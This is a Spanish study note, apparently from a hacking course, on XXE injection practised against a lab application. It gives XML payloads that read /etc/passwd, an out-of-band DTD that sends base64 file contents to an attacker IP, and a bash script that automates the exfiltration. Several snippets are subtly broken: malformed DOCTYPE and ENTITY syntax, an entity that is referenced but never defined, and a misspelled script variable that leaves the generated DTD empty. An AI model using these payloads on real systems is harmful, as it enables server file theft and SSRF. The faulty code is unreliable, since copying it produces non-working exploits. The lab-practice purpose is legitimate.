@@ -1,0 +1,157 @@
+# # XML External Entity Injection (XXE)
+
+Tags: #XXE #OWASP #Explotacion 
+
+Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.
+
+Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.
+
+Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.
+
+Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.
+
+Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.
+
+Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.
+
+Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.
+
+Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.
+
+Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.
+
+A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:
+
+-   **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
+
+![| 00x300](Pasted%20image%2020230420205723.png)
+![00x300](Pasted%20image%2020230420205849.png)
+![00x200](Pasted%20image%2020230420210056.png)
+![00x200](Pasted%20image%2020230420210113.png)  ![00x200](Pasted%20image%2020230420210246.png)
+![00x350](Pasted%20image%2020230420211907.png)
+![00x280](Pasted%20image%2020230420212052.png)
+Tambie podemos explotar
+![00x400](Pasted%20image%2020230421134216.png)
+
+## XML en la web
+
+* Usaremos XML como codigo para hacer los scripts. 
+* El campo en donde debemos de fijarnos es aquel que el **Input** es el que nos representa en la web como **Output**
+
+En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modificando
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<DOCTYPE foo [<! ENTITY myName "omar">]>                                                        <!-- Colocamos lo que queremos que salga en el output de la web -->
+	<root>
+		<name>
+			<email>
+				&myFile;
+			</email>
+		</name>
+	</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<DOCTYPE foo [<! ENTITY myFile SYSTEM "file:///etc/passwd">]>                                    <!-- Colocamos la ruta abosluta del archivo -->
+	<root>
+		<name>
+			<email>
+				&myFile;
+			</email>
+		</name>
+	</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<DOCTYPE foo [<! ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>    <!-- Representara el output en una sola linea en base64 -->
+	<root>
+		<name>
+			<email>
+				&myFile;
+			</email>
+		</name>
+	</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<DOCTYPE foo [<! ENTITY myFile SYSTEM "http://192.168.68.108/testXXE">]>            <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
+	<root>
+		<name>
+			<email>
+				&myFile;                                                              <!-- Llamamos a la entidad desde aqui -->
+			</email>
+		</name>
+	</root>
+```
+
+## **XXE OOB Blind**
+Cuando no se puede llamar la entidad desde el campo selecionado en la estructura, lo llamamos desde el DOCTYPE colocando el porcentaje al incio y final con el nombre. El archivo debe de tener la extension **.dtd**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>       <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
+	<root>
+		<name>
+			<email>
+				test@test.com                                                              <!-- Aveces no podemos llamar la entidad desde aqui -->
+			</email>
+		</name>
+	</root>
+```
+
+* Asi es como hariamos un archivo .dtd externo
+```bash
+❯ nvim malicious.dtd                        # Creamos el archivo malicioso
+```
+
+* Haremos que el output en base64 me lo envie a mi maquina de atacante como una peticion por GET. Esto dentro del archivo  malicious.dtd
+```xml
+<! ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<! ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;' >">                  <!-- Debemos de colocar el % en HEX = 25 --> 
+%eval;                                                                                                   <!-- Debemos de llamar a las entidades --> 
+%exfil; 
+```
+
+```bash
+❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
+```
+
+
+Con este automatizas el proceso y puedes solicitar el archivo que quieras.
+```bash
+❯ nvim xxe_oob.sh                        # Creamos el archivo para automatizar el resultado final 
+```
+
+```bash
+#!/bin/bash
+
+echo -ne "[+] Introdiuce el archivo a leer: " && read -r myFilename
+
+maliciuos_dtd="""
+<! ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$myFilename">
+<! ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;'>">                  
+%eval;                                                                                                    
+%exfil; """
+
+echo $malicious_dtd > malicious.dtd
+
+python3 -m http.server 80 &>response &
+
+PID=$!
+
+sleep 1; echo
+
+curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
+<DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>      
+<root><name><email>test@test.com</email></name></root>' &>/dev/null
+
+cat response  | grep -oP "/?file=\K[^.*]+" | base64 -d
+
+kill -9 $PID 
+wait $PID 2>/dev/null
+
+rm response 2>/dev/null
+
+```
